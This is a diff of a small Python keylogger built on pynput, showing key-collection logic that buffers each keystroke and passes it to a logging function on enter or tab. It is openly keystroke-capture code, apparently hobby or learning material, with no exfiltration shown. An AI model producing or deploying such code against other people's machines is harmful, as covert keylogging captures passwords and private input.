@@ -1,10 +1,18 @@
 from pynput.keyboard import Key, Listener
 
+# hold a list of all keys pressed until an enter or tab
 key_word = []
 
 
 def on_press(key_stroke):
-    if key_stroke == Key.enter or key_stroke == Key.tab:
+    # if the key pressed is the enter key, call write_keylog with the
+    # key_word list
+    if key_stroke == Key.enter:
+        write_keylog(key_word)
+    # if the key pressed is the tab key, append a special string and
+    # call write_keylog with the key_word list
+    elif key_stroke == Key.tab:
+        key_word.append("[tab]")
         write_keylog(key_word)
     else:
         key_word.append(key_stroke)
